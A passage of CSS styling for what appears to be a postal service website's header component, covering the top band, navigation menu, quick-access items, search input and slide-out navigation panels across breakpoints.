				padding-top: 8px;
				padding-bottom: 8px;
				margin-bottom: -20px;
				background-color: var(--_cdk-core-header-color-bar-top)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-bandtitle.sc-correos-cdk-core-header .bandtitle-textcontent.sc-correos-cdk-core-header {
				font-size: 14px;
				font-weight: bold
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-bandtitle.sc-correos-cdk-core-header .bandtitle-textcontent.sc-correos-cdk-core-header {
					font-size: 16px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header-bandtitle.sc-correos-cdk-core-header {
					margin-bottom: -24px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header {
					height: var(--_height-large)
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: justify;
				justify-content: space-between;
				padding-left: var(--_cdk-core-header-wrapper-gutters);
				padding-right: var(--_cdk-core-header-wrapper-gutters);
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				width: 100%;
				height: 100%;
				margin-top: 4px
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				height: 100%
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: center;
				justify-content: center;
				font-weight: 300;
				color: var(--_cdk-core-header-text-color);
				padding-left: 20px
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header:focus {
				-webkit-box-shadow: none;
				box-shadow: none
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header {
					padding-left: 32px
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header>span.sc-correos-cdk-core-header {
				font-size: 1rem;
				line-height: 1.5rem;
				margin-right: 0.5rem
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header>span.sc-correos-cdk-core-header {
					font-size: 1.125rem;
					line-height: 1.875rem
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header>i.sc-correos-cdk-core-header {
				-webkit-transition: -webkit-transform 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
				transition: -webkit-transform 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
				transition: transform 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
				transition: transform 0.3s cubic-bezier(0.165, 0.84, 0.44, 1), -webkit-transform 0.3s cubic-bezier(0.165, 0.84, 0.44, 1)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.--arrow-down.sc-correos-cdk-core-header>i.sc-correos-cdk-core-header {
				-webkit-transform: rotate(90deg);
				transform: rotate(90deg)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				margin-left: 40px;
				-ms-flex-item-align: center;
				align-self: center
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header {
					display: none
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header .cdk-header-menu-option.sc-correos-cdk-core-header {
				position: relative;
				text-align: center;
				-ms-flex-pack: center;
				justify-content: center;
				margin-right: 1.5rem;
				height: 2.5rem;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				cursor: pointer;
				-webkit-transition: background-color 0.15s linear;
				transition: background-color 0.15s linear;
				outline: none;
				color: var(--_cdk-core-header-panel-bg-secondary);
				min-width: 84px
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header .cdk-header-menu-option.--active.sc-correos-cdk-core-header {
				position: relative;
				font-weight: bold
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header .cdk-header-menu-option.--active.sc-correos-cdk-core-header::after {
				content: "";
				display: block;
				width: 100%;
				opacity: 1;
				will-change: opacity, width;
				-webkit-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
				transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
				height: 1px;
				position: absolute;
				bottom: 0;
				background-color: var(--_cdk-core-header-panel-bg-secondary)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header .cdk-header-menu-option.sc-correos-cdk-core-header:last-child {
				margin-right: 0
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header .cdk-header-menu-option.--no-min-width.sc-correos-cdk-core-header {
				min-width: 0px !important
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				color: var(--_cdk-core-header-text-color)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .--language-selector-item.--display-none.sc-correos-cdk-core-header {
				display: none !important
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .--avoid-border-right.sc-correos-cdk-core-header {
				border-right: none !important
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				height: 100%;
				padding: 0.25rem 0.7rem;
				display: flex;
				border-right: var(--_cdk-core-header-border-icon);
				font-size: 0.875rem;
				line-height: 1.375rem
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.main-header-language-selector.sc-correos-cdk-core-header {
				border-right: none;
				position: relative
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.main-header-language-selector.sc-correos-cdk-core-header::after {
				content: "";
				top: 13px;
				right: 0px;
				background-color: var(--theme-color-softGrey);
				width: 1px;
				height: 32px;
				position: absolute
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.main-header-language-selector.sc-correos-cdk-core-header {
					border-right: var(--_cdk-core-header-border-icon)
				}

				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.main-header-language-selector.sc-correos-cdk-core-header::before {
					display: none
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header {
					padding: 0.5rem 1rem;
					height: 50px
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header:last-child {
				border-right: none
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center;
				-ms-flex-align: center;
				align-items: center
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header>span.sc-correos-cdk-core-header {
				margin-left: 1rem;
				display: none
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header>span.sc-correos-cdk-core-header {
					display: block
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header>span.sc-correos-cdk-core-header:hover {
				text-decoration: underline
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--hide-on-desktop.sc-correos-cdk-core-header {
					display: none
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--hide-label-on-mobile.sc-correos-cdk-core-header {
				display: none
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--hide-label-on-mobile.sc-correos-cdk-core-header {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-align: center;
					align-items: center;
					padding: 0
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--hide-label-on-desktop.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header>span.sc-correos-cdk-core-header {
					display: none
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-title.sc-correos-cdk-core-header {
				font-weight: bold
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container.sc-correos-cdk-core-header {
				display: block;
				position: absolute;
				left: 0;
				background-color: white;
				width: 100%;
				border-bottom: 1px solid var(--theme-color-softGrey);
				top: 8px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container.sc-correos-cdk-core-header .cdk-header-input-search.sc-correos-cdk-core-header {
					width: 100%
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container--mobile-open.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container--mobile-open.sc-correos-cdk-core-header .cdk-header-input-search.sc-correos-cdk-core-header {
				width: 90%;
				display: inline-block;
				position: relative;
				border-right: 1px solid var(--theme-color-softGrey)
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container--mobile-open.sc-correos-cdk-core-header .cdk-header-input-search.sc-correos-cdk-core-header {
					border-right: none
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container.sc-correos-cdk-core-header .cdk-header-close-button.sc-correos-cdk-core-header {
				display: inline-block;
				position: relative;
				width: 10%
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container.sc-correos-cdk-core-header .cdk-header-close-button.sc-correos-cdk-core-header {
					display: none
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container.sc-correos-cdk-core-header .cdk-header-close-button.sc-correos-cdk-core-header .cdk-header-close-icon.sc-correos-cdk-core-header {
				margin: 0 auto;
				color: var(--_cdk-core-header-text-color)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container--mobile-close.sc-correos-cdk-core-header {
				display: none
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container.sc-correos-cdk-core-header {
					display: -ms-flexbox;
					display: flex;
					width: 410px;
					position: relative;
					border-bottom: none;
					top: 0
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .--displayNone.sc-correos-cdk-core-header {
				display: none
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .--displayNone.sc-correos-cdk-core-header {
					display: -ms-flexbox;
					display: flex
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header {
				position: absolute;
				left: 0;
				right: 0;
				z-index: 16;
				display: none;
				top: var(--_height);
				height: calc(100% - var(--_height))
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header {
					top: var(--_height-large);
					height: calc(100% - var(--_height-large))
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.--adapt-band.sc-correos-cdk-core-header {
				top: calc(var(--_height) + 44px);
				height: calc(100% - (var(--_height) + 44px))
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.--adapt-band.sc-correos-cdk-core-header {
					top: calc(var(--_height) + 58px);
					height: calc(100% - (var(--_height) + 58px))
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.--show.sc-correos-cdk-core-header {
				display: block
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.--show.sc-correos-cdk-core-header .cdk-nav-overlay.sc-correos-cdk-core-header {
				opacity: 1
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.--show.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header {
				opacity: 1
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header {
				position: absolute;
				display: block;
				z-index: 8;
				top: 0;
				bottom: 0;
				left: 0;
				right: 0;
				width: 100%;
				height: 100%;
				opacity: 0
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header {
					display: -ms-flexbox;
					display: flex
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header {
					-webkit-transition: opacity 0.15s linear;
					transition: opacity 0.15s linear;
					display: -ms-flexbox;
					display: flex
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header::before {
				-webkit-transition: background-color 0.3s linear;
				transition: background-color 0.3s linear;
				will-change: background-color;
				content: "";
				display: none;
				-ms-flex: 1 1 auto;
				flex: 1 1 auto
			}

			@media (max-width: var(--theme-layout-wrapper)) and (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header::before {
					padding-left: 1.5rem
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header::before {
					display: none
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-scroll-bar.sc-correos-cdk-core-header {
				margin-left: 10px
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-scroll-bar.sc-correos-cdk-core-header {
					margin-left: 0px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-scroll-bar.sc-correos-cdk-core-header {
					margin-left: 0px
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header {
				position: absolute;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				overflow-y: auto;
				overflow-x: hidden
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header {
					position: initial
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header {
					position: relative
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
				-webkit-transition: background-color 0.3s linear;
				transition: background-color 0.3s linear;
				will-change: background-color;
				z-index: 7
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
					max-width: 368px;
					width: 50vw
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
					max-width: 468px;
					z-index: 11
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-second.sc-correos-cdk-core-header {
				width: 100%;
				height: 100%;
				z-index: 9;
				pointer-events: none;
				position: relative
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-second.sc-correos-cdk-core-header {
					pointer-events: all;
					width: initial;
					min-width: 464px
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-second.--show.sc-correos-cdk-core-header {
				pointer-events: all
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-second.sc-correos-cdk-core-header .cdk-nav-page-click-outside.sc-correos-cdk-core-header {
				position: absolute;
				top: 0;
				left: 0;
				right: 0;
				bottom: 0;
				z-index: 9;
				display: none
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-second.sc-correos-cdk-core-header .cdk-nav-page-click-outside.sc-correos-cdk-core-header {
					display: block
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header {
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				padding: 1.5rem 1.5rem 2rem 1.5rem
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-first.sc-correos-cdk-core-header {
				height: 100%;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-first.sc-correos-cdk-core-header>*.sc-correos-cdk-core-header {
				width: 100%
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-first.sc-correos-cdk-core-header {
					margin-left: 12px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-first.sc-correos-cdk-core-header {
					width: 430px;
					margin-left: 40px
				}
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-second.sc-correos-cdk-core-header {
				width: 100%;
				height: 100%;
				position: relative;
				overflow: auto;
				z-index: 10;
				color: var(--_cdk-core-header-subpanel-text-subpanel);
				background-color: var(--_cdk-core-header-subpanel-bg);
				-webkit-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
				transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
				opacity: 0;
				pointer-events: none;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				padding: 1.5rem;
				-webkit-transform: translateX(20px);
				transform: translateX(20px)
			}

			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-second.sc-correos-cdk-core-header>*.sc-correos-cdk-core-header {
				width: 100%
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-second.sc-correos-cdk-core-header {
					padding: 0 2.5rem 2rem 2.5rem
				}
			}

			@media (min-width: 1024px) {
